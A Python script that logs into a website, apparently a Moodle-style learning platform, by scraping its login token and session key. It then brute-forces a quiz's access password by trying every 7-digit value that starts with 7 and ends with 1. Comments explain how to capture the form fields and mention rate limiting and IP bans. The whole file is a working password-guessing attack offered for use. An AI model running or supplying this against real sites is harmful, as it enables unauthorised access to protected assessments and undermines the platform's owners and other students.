import requests
from bs4 import BeautifulSoup
# Setting up the user agent string, probably not needed, but I've observed some instances where the website would need it
# Change the below header based on the OS and Web browser that you're using, here im using firefox.
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0'}

session = requests.Session()
url = "http://example.com"

# We first get the login page, which contains our login token
response = session.get(url)

# We parse it using beautiful soup so I can get the login token attribute in a sane manner
parsed_html = BeautifulSoup(response.text, "html.parser")

# We search through the html for the form, find the input tag which has the attribute logintoken
# then, we just access the attributes of the tag as a dictionary and .get() the value attribute which holds our login token generated from the server.
logintoken = parsed_html.body.find('form').find('input', attrs=dict(name='logintoken')).attrs.get('value')

# Store all the cookies, mainly <WesbiteName>Session. This is our session token.
cookies = session.cookies.get_dict()
#'data' info. can be gathered by: Right Click + Inspect -> Network -> (send a false username and/or password request to the login page) -> 
# Click on the most recent example.php -> Payload (that's your "data")
data = {"username": "exampleusername", "password": "examplepassword", "logintoken": logintoken, "anchor": ""}

request = session.post(url, data=data, headers=headers, cookies=cookies)



if 'Invalid login, please try again' in request.text:
    print('Login failed.')
else:
    print('Login successful.')

response2 = session.get("http://example.com/path/to/the/webpage/within/the/website/you're/currently/authenticated/in")


parsed_html2 = BeautifulSoup(response2.text, "html.parser")

forms = parsed_html2.find_all('form')
for form in forms:
    if form.find('input', attrs={'name': 'sesskey'}):
        sesskey = form.find('input', attrs={'name': 'sesskey'})['value']
        break
#the password is not fully known, however in this example here, we have previous knowledge that the password is 7 digits long, the first digit being #7 and the last being #1.        
for i in range(00000, 10**5):  # Loop through all possible values from 1 to 999999
    quizpassword = '7{:05d}1'.format(i)  # Format the password with leading zeros and print it
    data2 = {"cmid": "113195", "sesskey": sesskey, "_qf__mod_quiz_preflight_check_form": 1,
             "quizpassword": quizpassword, "submitbutton": "Start+attempt"}

    r2 = session.post("http://example.com/path/to/the/webpage/within/the/website/you're/currently/authenticated/in", data=data2)
    print(quizpassword)
    #The below is just the error message that is displayed when deliberately supplying the webpage within false input
    if 'The password entered was incorrect' not in r2.text:
     print('Password found:', quizpassword)
     break

# Wait for 1 second before making the next request - can be helpful if the wesbite is rate limiting you. However, you might still get disconnected from the server after multiple login attempts or get your IP banned.
 #   time.sleep(1)
